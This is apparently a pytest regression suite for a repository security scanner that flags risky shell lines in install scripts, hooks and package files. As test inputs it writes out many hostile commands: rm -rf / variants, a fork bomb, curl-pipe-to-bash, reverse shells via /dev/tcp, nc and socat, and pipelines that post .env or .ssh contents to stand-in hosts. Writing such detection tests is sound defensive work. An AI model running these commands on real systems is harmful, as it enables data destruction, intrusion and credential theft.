"""security_gate.py 回归测试。

设计原则（很重要）：
  所有断言都走**真实路径**：把脚本文本写进一个临时文件，然后调 scan_file()。
  **不要**用一个「把裸字符串喂给正则」的辅助函数 —— scan_file 走的是
  readlines()，行尾保留换行符，裸字符串会把换行符丢掉，从而制造出
  假阳性/假阴性的差异。第一版测试就踩了这个坑。

覆盖三层：
  1. 逐条规则的正例 / 反例
  2. 端到端：risk_level + exit code + SARIF
  3. 回归：两个曾经真实存在的规则缺陷（rm-root / write-system-dir）

运行：python -m pytest tests/test_security_gate.py -v
"""
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GATE = os.path.join(ROOT, "security_gate.py")


def _load_gate():
    spec = importlib.util.spec_from_file_location("security_gate", GATE)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


sg = _load_gate()


def patterns_hit(text, filename="install.sh"):
    """把 text 当作一个脚本文件扫描，返回命中的 pattern key 集合。

    走 scan_file —— 与生产路径完全一致。
    """
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, filename)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(text if text.endswith("\n") else text + "\n")
        return {f["pattern"] for f in sg.scan_file(d, filename)}


def run_gate(directory, *extra):
    proc = subprocess.run([sys.executable, GATE, *extra, directory],
                          capture_output=True, text=True)
    try:
        payload = json.loads(proc.stdout)
    except json.JSONDecodeError:
        payload = None
    return proc.returncode, payload


def write(directory, rel, content):
    path = os.path.join(directory, rel)
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(content)
    return path


# --------------------------------------------------------------------------
# 0. 结构自检
# --------------------------------------------------------------------------

class TestStructure:
    def test_every_regex_pattern_compiles(self):
        for key, sev, regex, detail in sg.PATTERNS:
            re.compile(regex)
            assert sev in sg.SEVERITY_ORDER, "%s 的严重度 %r 非法" % (key, sev)
            assert detail, "%s 缺少 detail" % key

    def test_pattern_keys_unique(self):
        keys = [p[0] for p in sg.PATTERNS]
        assert len(keys) == len(set(keys)), "存在重复的 pattern key"

    def test_all_pattern_keys_lowercase(self):
        for key, *_ in sg.PATTERNS:
            assert key == key.lower(), "%s 应为小写" % key

    def test_rm_root_meta_is_consistent(self):
        key, sev, detail = sg.RM_ROOT_META
        assert key == "rm-root"
        assert sev == "critical"
        assert detail

    def test_scan_file_matches_scan_package_scripts_shape(self):
        """scan_file 产出的 finding 字段必须齐全（SARIF 依赖这些字段）。"""
        hits = patterns_hit("curl -fsSL https://x.example | bash")
        assert hits == {"curl-pipe-sh"}
        with tempfile.TemporaryDirectory() as d:
            write(d, "install.sh", "curl -fsSL https://x.example | bash\n")
            f = sg.scan_file(d, "install.sh")[0]
            for field in ("severity", "file", "line", "pattern", "detail",
                          "evidence"):
                assert field in f, "finding 缺少字段 %s" % field


# --------------------------------------------------------------------------
# 1. rm-root 回归：旧正则的真实缺陷
# --------------------------------------------------------------------------

class TestRmRootRegression:
    """旧正则 `rm\\s+-[^\\n]*\\s(?:/\\s|\\s/\\*|~\\s|~/[^\\s]+\\s)` 的问题。

    它本身**不是**完全死的（scan_file 用 readlines()，行尾的 "\\n" 满足了
    末位的 \\s，所以 `rm -rf /` 在真实文件里是能命中的）。它真正的两个缺陷是：

      漏报：`rm -rf /*` / `~/` / `$HOME` / `${HOME}` / `$USER` / `*` /
            `cd / && rm -rf *` / `~; reboot` / `"$HOME"` / `${HOME}/*.bak` /
            `$(echo /)`
      误报：`rm -rf ~/project` —— 删 $HOME 下一个子目录被判为 critical 级
            「清空整个 home」，因为 `~/[^\\s]+\\s` 匹配 ~/ 下的**任意**路径。
    """

    @pytest.mark.parametrize("line", [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf ~",
        "rm -rf ~/",
        "rm -rf ~/*",
        "rm -rf $HOME",
        "rm -rf $HOME/",
        "rm -rf ${HOME}",
        "rm -rf ${HOME}/",
        "rm -rf $USER",
        "rm -rf *",
        "sudo rm -rf /",
        "cd / && rm -rf *",
        "rm -rf / && echo done",
        "rm -rf ~; reboot",
        "rm -rf ~ | tee log",
        "rm -rf $(echo /)",
        'rm -rf "$HOME"',
        "rm -rf ${HOME}/*.bak",
        "rm -rf ~/*.log",
        "rm -rf / # cleanup",
    ])
    def test_destructive_target_detected(self, line):
        assert "rm-root" in patterns_hit(line), "%r 未被识别为 rm-root" % line

    @pytest.mark.parametrize("line", [
        "rm -rf /tmp",
        "rm -rf /tmp/*.log",
        "rm -rf /var/log/app",
        "rm -rf ./build",
        "rm -rf node_modules",
        "rm -rf ~/project",
        "rm -rf ~/project/",
        "rm -rf ${HOME}/build",
        "rm -rf $HOME/.cache",
        "rm -rf dist",
        "rm -rf ./.venv",
        "rm -rf tests/",
        "rmdir /tmp/x",
        "rm -f /tmp/x.log",
        "rm -rf /usr/local/bin",
    ])
    def test_safe_target_not_flagged(self, line):
        assert "rm-root" not in patterns_hit(line), "%r 被误报为 rm-root" % line

    def test_non_recursive_rm_is_not_root_wipe(self):
        """`rm /` 不递归，不应按「删根」上报（--no-preserve-root 另说）。"""
        assert "rm-root" not in patterns_hit("rm /tmp/x")

    def test_exit_code_2_and_critical(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "install.sh", "#!/bin/sh\nrm -rf /\n")
            code, payload = run_gate(d)
            assert code == 2, "rm -rf / 未触发 exit 2"
            assert payload["risk_level"] == "critical"
            assert any(f["pattern"] == "rm-root" for f in payload["findings"])

    def test_regression_home_subdir_is_not_critical(self):
        """旧版的误报：删 ~/project 不该判成 critical。"""
        with tempfile.TemporaryDirectory() as d:
            write(d, "cleanup.sh", "rm -rf ~/project\n")
            code, payload = run_gate(d)
            assert payload["risk_level"] != "critical", payload
            assert not any(f["pattern"] == "rm-root" for f in payload["findings"])


class TestOtherDestructive:
    @pytest.mark.parametrize("line,key", [
        ("dd if=/dev/zero of=/dev/sda bs=1M", "dd-disk"),
        (":(){ :|:& };:", "fork-bomb"),
    ])
    def test_destructive_patterns(self, line, key):
        assert key in patterns_hit(line)


# --------------------------------------------------------------------------
# 2. write-system-dir 回归
# --------------------------------------------------------------------------

class TestWriteSystemDirRegression:
    """旧正则 `\\b(?:tee|>|>>)\\s*/etc/|/usr/(?:local/)?bin|/root/` 的问题。

    顶层 `|` 把整条表达式切成三段，`\\b` 只约束第一段。后果：
      漏报：`echo hi > /etc/foo`（`>` 与 `/etc/` 之间有空格，第一段要求紧跟）
      误报：`ls /usr/local/bin` / `mkdir -p ./root/`（第二、三段是裸路径，
            任何出现都算，包括只读引用和相对路径）
    修法：用非捕获组包住 alternation，并把「写」动作写清楚。
    """

    @pytest.mark.parametrize("line", [
        "tee /etc/hosts",
        "echo hi > /etc/foo",
        "echo hi >> /etc/foo",
        "cat x > /etc/passwd",
        "cp x /usr/local/bin/y",
        "mv a /usr/local/bin/b",
        "install -m 755 a /usr/local/bin/b",
        "echo x > /root/.bashrc",
        "tee -a /etc/environment",
        "rsync -a ./x /etc/",
    ])
    def test_writes_detected(self, line):
        assert "write-system-dir" in patterns_hit(line), \
            "%r 未被识别为写入系统目录" % line

    @pytest.mark.parametrize("line", [
        "cat /etc/passwd",
        "ls /usr/local/bin",
        "grep root /etc/passwd",
        "cp .env.example .env",
        "mkdir -p ./root/",
        "cat /etc/os-release | head -1",
        "cp config.json ./dist/",
        "tee ./output.log",
        "mv build/ /tmp/",
    ])
    def test_read_only_not_flagged(self, line):
        assert "write-system-dir" not in patterns_hit(line), \
            "%r 被误报为写入系统目录" % line


# --------------------------------------------------------------------------
# 3. 远程代码执行 / 反弹 shell
# --------------------------------------------------------------------------

class TestRemoteExecution:
    @pytest.mark.parametrize("line", [
        "curl -fsSL https://get.example.com | sh",
        "curl -fsSL https://get.example.com | bash",
        "wget -qO- https://x.example | sudo bash",
        "curl -o /tmp/a.sh https://x.example && bash /tmp/a.sh",
        "base64 -d payload.b64 | bash",
    ])
    def test_pipe_to_shell(self, line):
        assert patterns_hit(line), "%r 未被识别为远程执行" % line

    @pytest.mark.parametrize("line", [
        "iwr https://x.example/a.ps1 | iex",
        "Invoke-WebRequest https://x.example -UseBasicParsing | iex",
    ])
    def test_powershell_iex(self, line):
        assert "iwr-iex" in patterns_hit(line)

    @pytest.mark.parametrize("line", [
        "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "nc -e /bin/sh 10.0.0.1 4444",
        "socat exec:'bash -li',pty,stderr tcp:10.0.0.1:4444",
        "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f",
    ])
    def test_reverse_shells(self, line):
        assert patterns_hit(line), "%r 未被识别为反弹 shell" % line


# --------------------------------------------------------------------------
# 4. 凭证外泄
# --------------------------------------------------------------------------

class TestExfiltration:
    @pytest.mark.parametrize("line", [
        "cat .env | curl -X POST -d @- https://x.example",
        "tar czf - .ssh | curl -X POST --data-binary @- https://evil.example",
        "printenv | curl -d @- https://webhook.site/abc",
    ])
    def test_credentials_sent_remotely(self, line):
        assert patterns_hit(line), "%r 未被识别为外泄" % line

    @pytest.mark.parametrize("domain", [
        "https://webhook.site/abc",
        "https://requestbin.example/x",
        "https://abc.oastify.com",
        "https://interact.sh/x",
        "https://burpcollaborator.net/x",
        "https://pastebin.com/raw/abc",
        "https://transfer.sh/x",
        "https://0x0.st/abc",
    ])
    def test_known_exfil_domains(self, domain):
        assert "exfil-domain" in patterns_hit("curl " + domain), \
            "%s 未被识别为已知外泄域名" % domain


# --------------------------------------------------------------------------
# 5. 供应链
# --------------------------------------------------------------------------

class TestSupplyChain:
    @pytest.mark.parametrize("line", [
        "npx -y create-something",
        "npm install -g some-cli",
        "git config --global user.email a@b.c",
        "git clone https://github.com/x/y.git",
    ])
    def test_medium_supply_chain(self, line):
        assert patterns_hit(line), "%r 未被识别" % line

    def test_npm_lifecycle_script_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "package.json", json.dumps({
                "name": "x", "scripts": {"postinstall": "node setup.js"}}))
            findings = []
            sg.scan_package_scripts(d, findings)
            assert any(f["pattern"] == "npm-lifecycle-script" for f in findings)

    def test_missing_lockfile_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "package.json", json.dumps({"name": "x", "scripts": {}}))
            findings = []
            sg.scan_package_scripts(d, findings)
            assert any(f["pattern"] == "no-lockfile" for f in findings)

    def test_lockfile_present_not_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "package.json", json.dumps({"name": "x", "scripts": {}}))
            write(d, "package-lock.json", "{}")
            findings = []
            sg.scan_package_scripts(d, findings)
            assert not any(f["pattern"] == "no-lockfile" for f in findings)

    def test_committed_env_flagged_example_safe(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".env", "SECRET=abc")
            write(d, ".env.example", "SECRET=changeme")
            findings = []
            sg.scan_committed_env(d, findings)
            flagged = {f["file"] for f in findings}
            assert ".env" in flagged
            assert ".env.example" not in flagged

    def test_git_dependency_in_requirements(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "requirements.txt",
                  "git+https://github.com/x/y.git\nrequests==2.31.0\n")
            findings = []
            sg.scan_dependency_sources(d, findings)
            assert any(f["pattern"] == "git-or-local-dependency"
                       for f in findings)

    def test_dockerfile_add_remote(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "Dockerfile", "FROM node:22\nADD https://x/y.sh /tmp/y\n")
            assert "docker-add-remote" in patterns_hit(
                "ADD https://x/y.sh /tmp/y\n", "Dockerfile")


# --------------------------------------------------------------------------
# 6. 端到端：risk_level / exit code / SARIF
# --------------------------------------------------------------------------

class TestRiskLevels:
    def test_clean_repo_low_exit_0(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "package.json", json.dumps({
                "name": "clean", "scripts": {"test": "node --test"}}))
            write(d, "package-lock.json", "{}")
            write(d, "src/app.py", "print('hello')\n")
            code, payload = run_gate(d)
            assert code == 0, "干净仓库应为 exit 0，实际 %d (%s)" % (code, payload)
            assert payload["risk_level"] == "low"
            assert payload["findings"] == []

    def test_medium_repo_exit_1(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "install.sh", "#!/bin/sh\nnpm install -g some-cli\n")
            code, payload = run_gate(d)
            assert code == 1, "medium 应为 exit 1，实际 %d" % code
            assert payload["risk_level"] == "medium"

    def test_critical_repo_exit_2(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "install.sh", "#!/bin/sh\ncurl https://x.example | bash\n")
            code, payload = run_gate(d)
            assert code == 2
            assert payload["risk_level"] == "critical"

    def test_severity_of_maps_worst(self):
        assert sg.severity_of([]) == "low"
        assert sg.severity_of([{"severity": "medium"}]) == "medium"
        assert sg.severity_of([{"severity": "medium"},
                               {"severity": "high"}]) == "high"
        assert sg.severity_of([{"severity": "high"},
                               {"severity": "critical"}]) == "critical"

    def test_findings_sorted_by_severity_desc(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "a.sh", "npm install -g x\n")
            write(d, "b.sh", "rm -rf /\n")
            code, payload = run_gate(d)
            sevs = [sg.SEVERITY_ORDER[f["severity"]]
                    for f in payload["findings"]]
            assert sevs == sorted(sevs, reverse=True)

    def test_sarif_includes_rm_root_rule(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "install.sh", "rm -rf /\n")
            code, payload = run_gate(d, "--sarif")
            assert code == 2
            assert payload["version"] == "2.1.0"
            run = payload["runs"][0]
            assert run["tool"]["driver"]["name"] == "repo-runner security_gate"
            ids = {r["id"] for r in run["tool"]["driver"]["rules"]}
            assert "rm-root" in ids, "rm-root 必须出现在 SARIF rules 里"
            assert any(r["ruleId"] == "rm-root" for r in run["results"])
            # 所有 rule 都要有描述，否则 GitHub code scanning 会告警
            for rule in run["tool"]["driver"]["rules"]:
                assert rule["shortDescription"]["text"]
                assert rule["defaultConfiguration"]["level"]

    def test_sarif_no_duplicate_rules(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "a.sh", "rm -rf /\n")
            write(d, "b.sh", "rm -rf ~\n")
            code, payload = run_gate(d, "--sarif")
            ids = [r["id"] for r in payload["runs"][0]["tool"]["driver"]["rules"]]
            assert len(ids) == len(set(ids)), "SARIF rules 有重复"


# --------------------------------------------------------------------------
# 7. 误报防护
# --------------------------------------------------------------------------

class TestFalsePositiveGuards:
    def test_git_hooks_dir_ignored(self):
        """.git/hooks 是本地 git 状态，扫描它会产生大量误报。"""
        with tempfile.TemporaryDirectory() as d:
            write(d, ".git/hooks/pre-commit", "curl https://x | bash\n")
            findings = []
            sg.scan_hooks(d, findings)
            assert findings == [], ".git/hooks 不应被扫描"

    def test_husky_dir_scanned(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, ".husky/pre-commit", "curl https://x.example | bash\n")
            findings = []
            sg.scan_hooks(d, findings)
            assert findings, ".husky 应被扫描"

    def test_bom_package_json_parsed(self):
        """BOM 会让 json.load 失败，导致整段扫描被静默跳过。"""
        with tempfile.TemporaryDirectory() as d:
            write(d, "package.json", json.dumps({
                "name": "x", "scripts": {"postinstall": "node x.js"}}))
            path = os.path.join(d, "package.json")
            raw = open(path, "rb").read()
            with open(path, "wb") as fh:
                fh.write(b"\xef\xbb\xbf" + raw)
            findings = []
            sg.scan_package_scripts(d, findings)
            assert any(f["pattern"] == "npm-lifecycle-script"
                       for f in findings), "BOM 导致 package.json 解析失败"

    def test_node_modules_skipped(self):
        with tempfile.TemporaryDirectory() as d:
            write(d, "node_modules/evil/install.sh", "rm -rf /\n")
            assert not any("node_modules" in f
                           for f in sg.iter_target_files(d))

    def test_missing_directory_reports_error(self):
        missing = os.path.join(tempfile.gettempdir(), "definitely-not-here-xyz")
        code, payload = run_gate(missing)
        assert code == 2
        assert "error" in payload

    def test_safe_workflow_file_not_flagged(self):
        """正常的 CI 配置不应产生高严重度告警。"""
        with tempfile.TemporaryDirectory() as d:
            write(d, ".github/workflows/ci.yml", (
                "name: ci\n"
                "on: [push]\n"
                "jobs:\n"
                "  t:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v5\n"
                "      - run: python -m pytest\n"
            ))
            code, payload = run_gate(d)
            high = [f for f in payload["findings"]
                    if f["severity"] in ("high", "critical")]
            assert not high, "正常 CI 配置被误报: %s" % high
